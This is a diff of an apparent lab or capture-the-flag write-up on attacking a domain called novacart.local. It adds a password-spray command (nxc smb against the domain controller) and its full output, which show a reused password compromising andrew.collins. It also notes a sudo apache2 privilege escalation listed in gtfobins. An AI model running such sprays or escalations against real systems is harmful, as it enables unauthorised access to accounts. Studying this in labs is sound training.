@@ -1318,6 +1318,7 @@ NovaCart IT Operations
 
 Found some interesting things on the users desktop
 
+## WSL access
 ![](Pasted%20image%2020260503183337.png)
 
 There is also a link file which is running ssh using the private key which is also on the desktop, this is likely the WSL instance that was mentioned!
@@ -1352,7 +1353,7 @@ Matching Defaults entries for svc_unix on DC:
 User svc_unix may run the following commands on DC:
     (root) /usr/sbin/apache2
 ```
-So the password withing the sql config is this users password!
+So the password within the sql config is this users password!
 
 Apache2 has an entry in gtfobins
 
@@ -1382,5 +1383,37 @@ This password does not get me anywhere in the linux subsystem, so ill try a pass
 # Compromising `andrew.collins`
 
 ```python
-
+nxc smb dc.novacart.local -u users.txt -p 'administrator38' --continue-on-success
+SMB         10.0.18.23      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:novacart.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.18.23      445    DC               [-] novacart.local\Administrator:administrator38 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\Guest:administrator38 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\krbtgt:administrator38 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\j.bronski:administrator38 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\d.barowski:administrator38 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\svc_jenkins:administrator38 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\j.paul:administrator38 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\m.ruehl:administrator38 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\d.winkler:administrator38 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\j.dillon:administrator38 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\t.morris:administrator38 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\l.harrow:administrator38 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\l.forta:administrator38 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\p.bruce:administrator38 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\m.mignola:administrator38 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\l.thompson:administrator38 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\m.brown:administrator38 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\m.ibabao:administrator38 STATUS_ACCOUNT_RESTRICTION 
+SMB         10.0.18.23      445    DC               [+] novacart.local\andrew.collins:administrator38 
+SMB         10.0.18.23      445    DC               [-] novacart.local\m.turner:administrator38 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\d.parker:administrator38 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\j.bennett:administrator38 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\l.harrison:administrator38 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\o.griffin:administrator38 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\j.clark:administrator38 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\m.hughes:administrator38 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\d.james:administrator38 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\m.miller:administrator38 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\s.diaz:administrator38 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\cliff.b:administrator38 STATUS_LOGON_FAILURE 
 ```
+
